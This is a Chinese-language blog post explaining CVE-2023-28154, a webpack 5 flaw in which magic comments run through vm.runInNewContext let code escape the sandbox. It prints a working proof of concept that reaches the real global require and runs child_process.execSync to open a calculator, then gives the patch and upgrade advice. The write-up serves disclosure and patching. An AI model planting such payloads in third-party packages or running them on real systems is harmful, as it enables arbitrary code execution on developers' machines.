---
title: "275 - 《Webpack 的任意代码漏洞是怎么回事》"
date: 2023-03-15
url: https://sorrycc.com/webpack-arbitrary-code-vulnerability
---

发布于 2023年3月15日

# 275 - 《Webpack 的任意代码漏洞是怎么回事》

> 昨晚从 [YingCi 的 Telegram](https://t.me/SakinaSpace/3514) 上看到的，然后今天研究了下，并且手动处理了 Umi 3 的 Webpack 5，在此记录下。

1、webpack 最近有个可以执行任意代码的漏洞[被修复](https://github.com/webpack/webpack/pull/16500)。这个漏洞如果被有心人利用，危害还是很大的。三方库里加一段「magic 代码」，就可以执行任意代码，比如打开你的计算器、读取你的账号信息啥的。

![](https://img.alicdn.com/imgextra/i4/O1CN01RK28CW1hztJME39Za_!!6000000004349-1-tps-1093-586.gif)

2、原理[这个评论](https://github.com/webpack/webpack/pull/16500#issuecomment-1462200769)已经解释地写了，我以我的理解再说一遍。

webpack 有个 [magic comment](https://webpack.js.org/api/module-methods/#magic-comments) 的功能，用户可以在此定义任意代码，包括字符串、正则和数组，用于自定义模块的执行方式。

```js
import(
  /* webpackChunkName: "my-chunk-name" */
  /* webpackMode: "lazy" */
  /* webpackExports: ["default", "named"] */
  'module'
);
```

这里的代码会通过 `vm.runInNewContext` 的方式被执行，用以拿到用户代码中自定义的内容。

```ts
 const val = vm.runInNewContext(`(function(){return {${value}};})()`); 
```

然后 webpack 会传入一个函数给这个自定义的内容。

```ts
importOptions.webpackExports.every( 
  item => typeof item === "string" 
))
```

这是问题就出现了，传给用户的函数是全局的。在 vm 里拿到这个函数后就可以先通过 `const realGlobalThis = fn.constructor('return this')()` 拿到全局 this 关键字，再通过 `const require = realGlobalThis.process.mainModule.constructor.createRequire(realGlobalThis.process.argv[1])` 拿到全局 require 函数，此时就可以做任何事情了，比如 `require('child_process').execSync("open -a Calculator")` 开一个计算器。

针对这个问题的完整复现代码如下，

```ts
const magicComment = `
webpackExports: ((() => {
    const array = ["a"]
    array.every = function (fun) {
        const realGlobalThis = fun.constructor('return this')();
        const require = realGlobalThis.process.mainModule.constructor.createRequire(realGlobalThis.process.argv[1])
        const spawn = require("child_process")
        spawn.execSync("open -a Calculator", {cwd: realGlobalThis.process.cwd()})
        return Reflect.apply(Array.prototype.every, array, [fun])
    }
    return array
})())
`;

const vm = require('vm');
const val = vm.runInNewContext(`(function(){return {${magicComment}};})()`);
val.webpackExports.every(item => typeof item === "string");
```

3、怎么修复这个问题？

拿到 val 之后，用 `JSON.parse(JSON.stringify())` 净化下用户代码，就可以去掉函数了。

```ts
val.webpackExports = JSON.parse(JSON.stringify(val.webpackExports));
```

4、作为用户需要做啥吗？如果没有锁版本，那不需要做任何事，重装依赖就好。如果锁了版本，需要手动升级到最新的 webpack 5、umi 3 或 umi 4。

参考:  
[Cross-realm object access in Webpack 5 · CVE-2023-28154 · GitHub Advisory Database · GitHub](https://github.com/advisories/GHSA-hc6q-2mpp-qw7j)  
[NVD - CVE-2023-28154](https://nvd.nist.gov/vuln/detail/CVE-2023-28154)  
[security: avoid cross-realm objects by Jack-Works · Pull Request #16500 · webpack/webpack · GitHub](https://github.com/webpack/webpack/pull/16500)
